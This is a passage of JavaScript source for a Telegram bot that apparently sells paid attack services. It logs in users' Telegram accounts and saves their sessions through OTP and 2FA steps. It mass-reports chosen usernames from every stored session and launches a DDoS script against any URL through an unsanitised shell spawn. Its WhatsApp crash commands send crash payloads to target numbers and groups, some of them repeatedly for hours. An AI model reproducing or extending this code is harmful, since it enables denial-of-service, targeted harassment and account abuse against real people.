    if (!Array.isArray(db.premium) ||
        !db.premium.map(String).includes(userId)) {
        tgLoginStates.delete(chatId);

        try {
            await state.client.disconnect();
        } catch (e) {}

        return S7.sendMessage(chatId, '💎 Premium membership required.');
    }

    const text = msg.text.trim();

    if (text === '/cancel') {
        tgLoginStates.delete(chatId);

        try {
            await state.client.disconnect();
        } catch (e) {}

        return S7.sendMessage(chatId, '❌ Telegram login cancelled.');
    }

    // Other bot commands ko OTP/password mat samjho
    if (text.startsWith('/')) return;

    // PHONE NUMBER
    if (state.step === 'phone') {
        if (!/^\+[1-9]\d{7,14}$/.test(text)) {
            return S7.sendMessage(chatId, '❌ Invalid phone number. Country code ke saath bhejo.');
        }

        try {
            state.phone = text;

            const result = await state.client.sendCode(
                {
                    apiId: Number(TG_API_ID),
                    apiHash: TG_API_HASH
                },
                text
            );

            state.phoneCodeHash = result.phoneCodeHash;
            state.step = 'otp';

            return S7.sendMessage(
                chatId,
                '📩 Telegram OTP sent!\n\nAb OTP yahan bhejo.\n\n/cancel to cancel.'
            );
        } catch (err) {
            tgLoginStates.delete(chatId);

            try {
                await state.client.disconnect();
            } catch (e) {}

            return S7.sendMessage(chatId, '❌ OTP Send Error: ' + err.message);
        }
    }

    // OTP VERIFICATION
    if (state.step === 'otp') {
        if (!/^\d{4,6}$/.test(text)) {
            return S7.sendMessage(chatId, '❌ Invalid OTP format.');
        }

        try {
            await state.client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: state.phone,
                    phoneCodeHash: state.phoneCodeHash,
                    phoneCode: text
                })
            );

            saveTGSession(state.client, userId);
            tgLoginStates.delete(chatId);

            await state.client.disconnect();

            return S7.sendMessage(
                chatId,
                '✅ Telegram Account Login Successful!\n\nYour Telegram session has been saved.'
            );

        } catch (err) {
            if (
                err.errorMessage === 'SESSION_PASSWORD_NEEDED' ||
                err.message?.includes('SESSION_PASSWORD_NEEDED')
            ) {
                state.step = 'password';

                return S7.sendMessage(
                    chatId,
                    '🔐 Two-Step Verification enabled!\n\nApna 2FA password bhejo.\n\n/cancel to cancel.'
                );
            }

            return S7.sendMessage(chatId, '❌ OTP Error: ' + err.message);
        }
    }

    // TWO-STEP VERIFICATION
    if (state.step === 'password') {
        try {
            await state.client.signInWithPassword(
                {
                    apiId: Number(TG_API_ID),
                    apiHash: TG_API_HASH
                },
                {
                    password: async () => text,
                    onError: async (err) => {
                        return false;
                    }
                }
            );

            saveTGSession(state.client, userId);
            tgLoginStates.delete(chatId);

            await state.client.disconnect();

            return S7.sendMessage(
                chatId,
                '✅ 2FA Verified!\n\nTelegram Account Connected. Your session has been saved.'
            );

        } catch (err) {
            return S7.sendMessage(
                chatId,
                '❌ 2FA Error: ' + err.message + '\n\nTry again or /cancel'
            );
        }
    }
});

// DISCONNECT COMMAND

SYLoVe('discounttg', async (msg) => {
    const chatId = String(msg.chat.id);
    const userId = String(msg.from.id);

    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
    }

    const db = getDB();

    if (!Array.isArray(db.premium) ||
        !db.premium.map(String).includes(userId)) {
        return S7.sendMessage(chatId, '💎 Premium Only! Upgrade to Premium to use this feature.');
    }

    // Pending login cancel karo
    const pending = tgLoginStates.get(chatId);

    if (pending && String(pending.userId) === userId) {
        tgLoginStates.delete(chatId);

        try {
            await pending.client.disconnect();
        } catch (e) {}
    }

    if (!Array.isArray(db.tgSessions)) {
        db.tgSessions = [];
    }

    const saved = db.tgSessions.find(
        item => String(item.userId) === userId
    );

    if (!saved) {
        return S7.sendMessage(chatId, '❌ No connected Telegram account found.');
    }

    let client;

    try {
        client = new TelegramClient(
            new StringSession(saved.session),
            TG_API_ID,
            TG_API_HASH,
            { connectionRetries: 5 }
        );

        await client.connect();

        await client.invoke(new Api.auth.LogOut());

        await client.disconnect();

        db.tgSessions = db.tgSessions.filter(
            item => String(item.userId) !== userId
        );

        saveDB(db);

        return S7.sendMessage(
            chatId,
            '✅ Telegram account disconnected.\n🗑 Your saved session has been deleted.'
        );

    } catch (err) {
        if (client) {
            try {
                await client.disconnect();
            } catch (e) {}
        }

        return S7.sendMessage(chatId, '❌ Disconnect Error: ' + err.message);
    }
});

    //status check
        
SYLoVe('checktgac', async (msg) => {
    const chatId = String(msg.chat.id);
    const userId = String(msg.from.id);

    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
    }

    const db = getDB();

    if (!Array.isArray(db.premium) ||
        !db.premium.map(String).includes(userId)) {
        return S7.sendMessage(chatId, '💎 Premium Only!');
    }

    const sessions = Array.isArray(db.tgSessions)
        ? db.tgSessions
        : [];

    if (sessions.length === 0) {
        return S7.sendMessage(
            chatId,
            '❌ No Telegram sessions found.'
        );
    }

    await S7.sendMessage(
        chatId,
        `🔍 Checking Telegram Accounts...\n\nTotal Saved: ${sessions.length}\nPlease wait...`
    );

    let active = 0;
    let inactive = 0;

    for (const item of sessions) {
        if (!item.session || !item.userId) {
            inactive++;
            continue;
        }

        let client;

        try {
            client = new TelegramClient(
                new StringSession(item.session),
                Number(TG_API_ID),
                TG_API_HASH,
                { connectionRetries: 2 }
            );

            await client.connect();

            const authorized = await client.isUserAuthorized();

            if (authorized) {
                active++;
            } else {
                inactive++;
            }

        } catch (err) {
            inactive++;
        } finally {
            if (client) {
                try {
                    await client.disconnect();
                } catch (e) {}
            }
        }
    }

    return S7.sendMessage(
        chatId,
        `📊 TELEGRAM ACCOUNT STATUS\n\n` +
        `👥 Total Accounts: ${sessions.length}\n` +
        `🟢 Active Accounts: ${active}\n` +
        `🔴 Inactive Accounts: ${inactive}\n\n` +
        `✅ Check Completed.`
    );
});
       //love dev
        
      // ---------- /lovedev ----------
SYLoVe('lovedev', async (msg) => {
  const chatId = String(msg.chat.id);
  const userId = String(msg.from?.id);
  if (!userId) return;

  if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

  const client = await getTGClient(userId);
  if (!client) {
    return S7.sendMessage(chatId, '❌ Pehle /logintg se apna Telegram account connect karo.');
  }

  reportStates.set(chatId, {
    userId,
    client,
    step: 'username',
    expiresAt: Date.now() + REPORT_TTL,
  });

  return S7.sendMessage(chatId, '👤 Send me the username to report.\n\nExample: @target\n\n/cancel to cancel');
});

// ---------- input handler ----------
S7.on('message', async (msg) => {
  if (msg.out || !msg.from || !msg.text) return;

  const chatId = String(msg.chat.id);
  const userId = String(msg.from.id);
  const st = reportStates.get(chatId);
  if (!st || st.userId !== userId) return;

  msg.__loginClaimed = true; // same guard as the login flow
  const text = msg.text.trim();

  if (Date.now() > st.expiresAt) {
    endReport(chatId);
    return S7.sendMessage(chatId, '⌛ Report timed out. Send /lovedev again.');
  }
  st.expiresAt = Date.now() + REPORT_TTL;

  if (text === '/cancel') {
    endReport(chatId);
    return S7.sendMessage(chatId, '❌ Report cancelled.');
  }

  // STEP 1: username
  if (st.step === 'username') {
    if (!/^@?[a-zA-Z][a-zA-Z0-9_]{3,31}$/.test(text)) {
      return S7.sendMessage(chatId, '❌ Invalid username. Example: @target');
    }
    st.target = text.startsWith('@') ? text : '@' + text;
    st.step = 'reason';
    return S7.sendMessage(chatId, MENU_TEXT);
  }

  // STEP 2: reason
  if (st.step === 'reason') {
    const opt = REPORT_OPTIONS.find(o => o.id === text);
    if (!opt) return S7.sendMessage(chatId, '❌ 1, 2, 3 ya 4 bhejo.\n\n' + MENU_TEXT);

    st.reasonId = opt.id;
    st.step = 'confirm';
    return S7.sendMessage(
      chatId,
      `Report bhejna hai?\n\nTarget: ${st.target}\nReason: ${opt.label}\n\n` +
      '✅ /yes to send\n❌ /cancel to cancel'
    );
  }

  // STEP 3: confirm — SAARE sessions se report
  if (st.step === 'confirm') {
    if (text !== '/yes') {
      return S7.sendMessage(chatId, '✅ /yes to send\n❌ /cancel to cancel');
    }

    const opt = REPORT_OPTIONS.find(o => o.id === st.reasonId);
    const startClient = st.client;   // /lovedev wala pehla account
    const target = st.target;
    const reportUserId = st.userId;
    endReport(chatId);

    if (!opt || !target) {
      return S7.sendMessage(chatId, '❌ Report state lost. Send /lovedev again.');
    }

    // Jitne sessions hain, sab
    const allClients = await getTGClients(reportUserId);
    const clients = startClient
      ? [startClient, ...allClients.filter(c => c !== startClient)]
      : allClients;

    if (clients.length === 0) {
      return S7.sendMessage(chatId, '❌ Pehle /logintg se apna Telegram account connect karo.');
    }

    let sent = 0;
    let stopReason = null;
    let firstError = null;

    for (const client of clients) {
      try {
        if (!client.connected) await client.connect();

        const peer = await client.getInputEntity(target);

        await client.invoke(
          new Api.account.ReportPeer({
            peer,
            reason: opt.reason(),
            message: `Reported via /lovedev: ${opt.label}`,
          })
        );
        sent++;
      } catch (err) {
        const code = err.errorMessage || '';
        firstError = firstError || err.message || code || 'unknown error';

        // Ye errors har session par same aayenge — aage try karna bekaar
        if (code.startsWith('FLOOD_WAIT_')) {
          const wait = Number(code.split('_').pop()) || 60;
          stopReason = `⏳ Telegram rate limit. ${wait}s ke baad try karo.`;
          break;
        }
        if (code.startsWith('USERNAME_NOT_OCCUPIED') || code.includes('PEER_ID_INVALID')) {
          stopReason = '❌ Username not found.';
          break;
        }
        if (code.startsWith('CHAT_ADMIN_REQUIRED') || code.includes('USER_NOT_MUTUAL_CONTACT')) {
          stopReason = '❌ Telegram ne report accept nahi kiya — target se pehle interaction hona zaroori hai.';
          break;
        }
        // Baaki error: is session ko chhod kar agla try karo
      }
    }

    const lines = [`Target: ${target}`, `Reason: ${opt.label}`];
    if (sent > 0) lines.push(`✅ ${sent}/${clients.length} accounts se report bhej di gayi.`);
    if (stopReason) lines.push(stopReason);
    if (sent === 0 && !stopReason) lines.push('❌ Report Error: ' + firstError);

    return S7.sendMessage(chatId, lines.join('\n'));
  }
});
        //start 
        SYLoVe(['start', 'menu'], (msg) => {
            const chatId = msg.chat.id;
            const name = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
            const uptime = getRuntime();

            const userFile = path.join(LoveDir, 'user.json');
            let users = [];
            if (fs.existsSync(userFile)) {
                users = JSON.parse(fs.readFileSync(userFile));
            }

            const userExists = users.find(u => u.id === chatId);
            if (!userExists) {
                users.push({ id: chatId, name: name, date: new Date().toLocaleString() });
                fs.writeFileSync(userFile, JSON.stringify(users, null, 2));
            }
            const love = msg.from.id.toString();

            const captionText = MainSYLoVe(name, uptime, love) + `

<blockquote>╭━━━━━━〔 ✦ Mᴇɴᴜ ✦ 〕━━━━━━╮
┃
┃        ⟬ Pʀᴇss A Bᴜᴛᴛᴏɴ ⟭
┃
╰━━━━━━━━━━━━━━━━━━━━━━━━╯</blockquote>
`;

            S7.sendVideo(chatId, LoveVideo, {
                caption: captionText,
                parse_mode: 'HTML',
                ...Lovesbutton
            }).catch(() => {
                S7.sendMessage(chatId, captionText, {
                    parse_mode: 'HTML',
                    ...Lovesbutton
                });
            });
        });
        
        SYLoVe('xxddos', (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ').slice(1);
    if (args.length < 2) {
        return S7.sendMessage(
            chatId,
            '❌ Usage:\n/xxddos <web> <time>\n\nExample:\n/ddos https://example.com 60'
        );
    }
    const target = args[0];
    const time = args[1];
    S7.sendMessage(
        chatId,
        `⚡ <b>Attacking Target</b>\n\n` +
        `🎯 Target: <code>${target}</code>\n` +
        `⏱ Time: <code>${time}</code> seconds\n\n` +
        `⚙️ Process started...`,
        { parse_mode: 'HTML' }
    );
    spawn(
  `node ./SY/ddos.js ${target} ${time}`,
  {
    shell: true,
    stdio: 'inherit'
  }
);

});


        SYLoVe('checkmembership', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            
            const isMember = await CheckSYlovesToo(S7, userId);

            if (isMember) {
                S7.sendMessage(chatId, `✅ <b>Membership verified!</b>\nYou are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`, { parse_mode: 'HTML' });
            } else {
                S7.sendMessage(chatId, protectionMessage, { parse_mode: 'HTML', ...SYLovesButton });
            }
        });
        
        
        SYLoVe('addtoken', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');
    const newToken = args[1];
    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
    }
    if (!newToken) return S7.sendMessage(chatId, 'Usage: /addtoken <token>');
    let db = getDB();
    if (db.tokens.find(t => t.token === newToken)) {
        return S7.sendMessage(chatId, '❌ Token already connected.');
    }
    const myBotsCount = db.tokens.filter(t => t.owner === userId).length;
    if (myBotsCount >= 5) {
        return S7.sendMessage(
            chatId,
            '🚫 Bot limit reached!\n\nYou can only add <b>5 bots maximum</b>.',
            { parse_mode: 'HTML' }
        );
    }
    try {
        const tempBot = new SY(newToken, { polling: false });
        const botInfo = await tempBot.getMe();
        db.tokens.push({
            token: newToken,
            owner: userId
        });
        saveDB(db);
        startSYloveBot(newToken);
        S7.sendMessage(chatId,
            `✅ Token Connected\nBot: ${botInfo.first_name}\n@${botInfo.username}`
        );
    } catch (e) {
        S7.sendMessage(chatId, '❌ Invalid token.');
    }
});
                SYLoVe('reqpair', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!number) {
                return S7.sendMessage(chatId, '❌ Provide a phone number.\nExample: /reqpair +999999999999');
            }

            const cleanNumber = number.replace(/[^0-9]/g, '');           
            await StartLovingSY(chatId, cleanNumber, S7);
        });

        SYLoVe('delpair', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];

            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!number) {
                return S7.sendMessage(chatId, '❌ Provide a phone number.\nExample: /reqpair +999999999999');
            }

            const cleanNumber = number.replace(/[^0-9]/g, '');
            const SYPaTH = `./Love/auth/${chatId}/${cleanNumber}`;

            if (fs.existsSync(SYPaTH)) {
                try {
                    fs.rmSync(SYPaTH, { recursive: true, force: true });
                    S7.sendMessage(chatId, `🗑️ Session deleted successfully for <b>${cleanNumber}</b>.`, { parse_mode: 'HTML' });
                } catch (err) {
                    S7.sendMessage(chatId, `❌ Failed to delete session: ${err.message}`);
                }
            } else {
                S7.sendMessage(chatId, `⚠️ No session found for <b>${cleanNumber}</b>.`, { parse_mode: 'HTML' });
            }
        });
        

        SYLoVe('deltoken', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');
    const delToken = args[1];
    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
    }

    if (!delToken) return S7.sendMessage(chatId, 'Usage: /deltoken <token>');

    let db = getDB();
    const tokenObj = db.tokens.find(t => t.token === delToken);

    if (!tokenObj || tokenObj.owner !== userId) {
        return S7.sendMessage(chatId, '❌ No connected token found.');
    }

    db.tokens = db.tokens.filter(t => t.token !== delToken);
    saveDB(db);

    if (activeBots[delToken]) {
        await activeBots[delToken].stopPolling();
        delete activeBots[delToken];
    }
    log('info', `Token deleted: ${delToken.substring(0, 10)}...`);
    S7.sendMessage(chatId, '✅ Token deleted successfully.');
});

        SYLoVe('mytoken', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();

    let db = getDB();
    const myTokens = db.tokens.filter(t => t.owner === userId);
    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
    }

    if (myTokens.length === 0) {
        return S7.sendMessage(chatId, '❌ You have not added any tokens.');
    }

    let text = '<b>Your Connected Bots</b>\n';
    text += '────────────────────\n\n';

    let count = 1;

    for (const item of myTokens) {
        try {
            const bot = new SY(item.token, { polling: false });
            const info = await bot.getMe();

            text += `<b>${count}. ${info.first_name}</b>\n`;
            text += `👤 Username: <b>@${info.username}</b>\n`;
            text += `🔑 Token:\n<code>${item.token}</code>\n`;
            text += '────────────────────\n\n';

            count++;
        } catch (err) {
            text += `<b>${count}. ⚠️ Unknown Bot</b>\n`;
            text += `🔑 Token:\n<code>${item.token}</code>\n`;
            text += '────────────────────\n\n';
            count++;
        }
    }

    S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
});
        
        // ========== FIXED: addresell with proper admin check ==========
        SYLoVe('addresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }
            
            // 🔥 FIX: Convert to number for comparison
            if (Number(chatId) !== Number(config.adminId)) {
                return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');
            }

            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /addresell ID');

            let db = getDB();
            if (db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is already a Reseller.');

            db.resellers.push(targetId);
            saveDB(db);
            S7.sendMessage(chatId, `✅ ID ${targetId} added as Reseller.`);
        });

        // ========== AZZIX DESTROYED - ULTIMATE NUCLEAR BUG ==========
        SYLoVe(['merlindestroy', 'destroy', 'nuclear'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            }

            if (args.length < 2) {
                return S7.sendMessage(chatId, '❌ Usage: /merlindestroy number\nExample: /merlindestroy 919876543210');
            }

            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;
            
            // Limit count to prevent session logout
            let count = 1;
            if (args[2] && !isNaN(args[2])) {
                count = Math.min(parseInt(args[2]), 3); // Max 3 times
            }

            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) {
                    return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
                }

                log('command', msg.from.first_name, `Calling MERLIN DESTROYED on ${cleanTarget} via ${randomSession.num}`);
                
                // Professional message with photo
                const SYLoves = `┏━━━━━━⟬ 𝐄𝐌𝐏𝐈𝐑𝐄 𝗗𝗘𝗦𝗧𝗥𝗢𝗬𝗘𝗗 ⟭━━━━━━━┓
┃ 💀 Nuclear strike initiated
┃ Tᴀʀɢᴇᴛ : ${cleanTarget}
┃ Cᴏᴜɴᴛ : ${count}
┃ Pʟᴀᴛꜰᴏʀᴍ : Android/iOS
┃ Sᴛᴀᴛᴜs : Destroying...
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
                
                await S7.sendVideo(chatId, LoveVideo, { 
                    caption: SYLoves,
                    parse_mode: 'HTML'
                });

                // Call the ultimate destruction function with delays
                for (let i = 0; i < count; i++) {
                    await azzixdestroyedLogic.crashfinity(client, targetJid);
                    
                    // Add delay between multiple sends (10-20 seconds)
                    if (i < count - 1) {
                        const delayTime = getRandomDelay(10000, 20000);
                        log('info', 'SYSTEM', `Waiting ${delayTime/1000} seconds before next attack...`);
                        await new Promise(resolve => setTimeout(resolve, delayTime));
                    }
                }
                
                await S7.sendMessage(chatId, `✅ <b>💀 MERLIN DESTROYED completed on ${cleanTarget}</b>\n\n` +
                    `📱 Session: <code>${randomSession.num}</code>\n` +
                    `🎯 Attacks: ${count} time(s)\n` +
                    `💥 Target destroyed successfully!`, 
                    { parse_mode: 'HTML' });

            } catch (err) {
                log('error', 'azzixdestroyed', err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });
         // Bordchat 
        /*SYLoVe('broadcast', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();

    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
    }

    if (Number(chatId) !== Number(config.adminId)) {
        return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');
    }

    const message = msg.text.split(' ').slice(1).join(' ');

    if (!message) {
        return S7.sendMessage(chatId, 'Usage: /broadcast Your Message');
    }

    try {
        const fs = require('fs');
        const users = JSON.parse(fs.readFileSync('./love/user.json', 'utf8'));

        let success = 0;
        let failed = 0;

        await S7.sendMessage(chatId, '📢 Broadcast Started...');

        for (const user of users) {
            const targetId = typeof user === 'object' ? user.id : user;

            if (!targetId) {
                failed++;
                continue;
            }

            try {
                await S7.sendMessage(targetId.toString(), message);
                success++;
            } catch (err) {
                failed++;
            }

            await new Promise(resolve => setTimeout(resolve, 50));
        }

        return S7.sendMessage(chatId,
            `📢 BROADCAST COMPLETED

👥 Total Users: ${users.length}
✅ Successful: ${success}
❌ Failed: ${failed}`
        );

    } catch (err) {
        console.error('Broadcast Error:', err);
        return S7.sendMessage(chatId, '❌ Error: Unable to read ./love/user.json');
    }
});
        // ========== FIXED: delresell with proper admin check ==========
        SYLoVe('delresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }
            
            // 🔥 FIX: Convert to number for comparison
            if (Number(chatId) !== Number(config.adminId)) {
                return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');
            }

            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /delresell ID');

            let db = getDB();
            if (!db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is not a Reseller.');

            db.resellers = db.resellers.filter(id => id !== targetId);
            saveDB(db);
            S7.sendMessage(chatId, `✅ ID ${targetId} removed from Resellers.`);
       });*/

        // ========== FIXED: listresell with proper admin check ==========
        SYLoVe('listresell', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }
            
            // 🔥 FIX: Convert to number for comparison
            if (Number(chatId) !== Number(config.adminId)) {
                return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');
            }

            let db = getDB();
            if (db.resellers.length === 0) {
                return S7.sendMessage(chatId, 'No resellers found.');
            }

            let text = 'Reseller List:\n\n';

            for (let i = 0; i < db.resellers.length; i++) {
                const id = db.resellers[i].toString();
                try {
                    const user = await S7.getChat(id);
                    const username = user.username ? `@${user.username} : ` : '';
                    text += `${i + 1}. ${username}<code>${id}</code>\n`;
                } catch (e) {
                    text += `${i + 1}. \`${id}\`\n`;
                }
            }
            text += '\n──────────────────';

            S7.sendMessage(chatId, text, {
                parse_mode: 'HTML'
            });
        });

        SYLoVe('addprem', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            let db = getDB();
            
            // 🔥 FIX: String conversion
            const isOwner = chatId.toString() === config.adminId.toString();
            const isReseller = db.resellers.includes(chatId.toString());
            
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!isOwner && !isReseller) return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');

            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /addprem ID');

            if (db.premium.includes(targetId)) return S7.sendMessage(chatId, 'User is already Premium.');

            db.premium.push(targetId);
            saveDB(db);
            S7.sendMessage(chatId, `⭐ ID ${targetId} added to Premium.`);
      });

        SYLoVe('delprem', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            let db = getDB();
            
            // 🔥 FIX: String conversion
            const isOwner = chatId.toString() === config.adminId.toString();
            const isReseller = db.resellers.includes(chatId.toString());
            
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!isOwner && !isReseller) return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');

            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /delprem ID');

            if (!db.premium.includes(targetId)) return S7.sendMessage(chatId, 'User is not Premium.');

            db.premium = db.premium.filter(id => id !== targetId);
            saveDB(db);
            S7.sendMessage(chatId, `🗑️ ID ${targetId} removed from Premium.`);
      });
      
        SYLoVe('crash-ui', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const targetNum = args[1];
            
            const s7CM = `crashfinity`

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            }

            if (!targetNum) {
                return S7.sendMessage(chatId, `❌ Provide a phone number.\nExample: /${s7CM} +999999999999`);
            }

            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) {
                    return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
                }

                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
                
                if (typeof CrashLogic.crashfinity === 'function') {
                    await CrashLogic.crashfinity(client, targetJid);
                } else {
                    throw new Error(`Function not found in ${s7CM}.js`);
                }

                const SYLoves = BvgSYLoVe(cleanTarget)                                
                await S7.sendVideo(chatId, LoveVideo, { 
                    caption: SYLoves,
                    parse_mode: 'HTML'
                });

            } catch (err) {
                log('error', `${s7CM}`, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });
        
SYLoVe(['ios-gc', 'andro-gc', 'gckiller', 'groupui'], async (msg) => {
    try {
        const chatId = msg.chat.id.toString();
        const userId = msg.from.id.toString();
        const args = msg.text.split(' ');
        
        const s7CM = args[0].replace('/', '/').replace('.', ''); 
        const targetNum = args[1];
        const durationArg = args[2];

        if (!LoveGlobalState(userId)) {
            return sendSYLove(S7, chatId);
        }

        if (!waSessions[chatId] || waSessions[chatId].length === 0) {
            return S7.sendMessage(
                chatId,
                `❌ No Number connected please use /reqpair to connect.`
            );
        }

        if (!targetNum || !durationArg) {
            return S7.sendMessage(
                chatId,
                `❌ Provide a GC jid and Duration.\nExample: /${s7CM} 1236xxx@g.us 2`
            );
        }

        if (!targetNum.endsWith('@g.us')) {
            return S7.sendMessage(chatId, '❌ Invalid group JID');
        }

        if (isNaN(durationArg)) {
            return S7.sendMessage(chatId, '❌ Duration must be a number (Hours)');
        }

        const targetJid = targetNum.trim();
        const hours = parseInt(durationArg);
        const durationMs = hours * 60 * 60 * 1000;
        const startTime = Date.now();

        const randomSession =
            waSessions[chatId][
                Math.floor(Math.random() * waSessions[chatId].length)
            ];

        const client = randomSession.sock;
        const senderNum = randomSession.num;

        log(
            'command',
            msg.from.first_name,
            `Calling ${s7CM} on ${targetJid} for ${hours} hours via ${senderNum}`
        );

        const SYLoves = BvgSYLoVe(targetJid);

        await S7.sendVideo(chatId, LoveVideo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        let attackCount = 0;
        while ((Date.now() - startTime) < durationMs) {
            if (typeof XgcLogic.Xgc === 'function') {
                await XgcLogic.Xgc(client, targetJid);
                attackCount++;
                
                // Add delay between attacks (5-10 seconds)
                if (attackCount % 3 === 0) {
                    const delayTime = getRandomDelay(8000, 15000);
                    log('info', 'SYSTEM', `Taking break for ${delayTime/1000} seconds...`);
                    await new Promise(resolve => setTimeout(resolve, delayTime));
                }
            }
            await new Promise(resolve => setTimeout(resolve, 2000));
        }

    } catch (err) {
        log('error', 'xgroup', err.message);
        await S7.sendMessage(
            msg.chat.id,
            `❌ Error: ${err.message}`
        );
    }
})


        
        
        SYLoVe(['newandro2', 'newandro3', 'newandro4'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: /${s7CM} +999999999999 2`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendVideo(chatId, LoveVideo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            // Limit count
            const maxCount = Math.min(count, 5);
            
            for (let i = 0; i < maxCount; i++) {
                await CallLogic.CallCrash(client, targetJid);
                
                if (i < maxCount - 1) {
                    const delayTime = getRandomDelay(5000, 10000);
                    await new Promise(resolve => setTimeout(resolve, delayTime));
                }
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;
            let attackCount = 0;

            while (Date.now() < endTime) {
                await CallLogic.CallCrash(client, targetJid);
                attackCount++;
                
                if (attackCount % 5 === 0) {
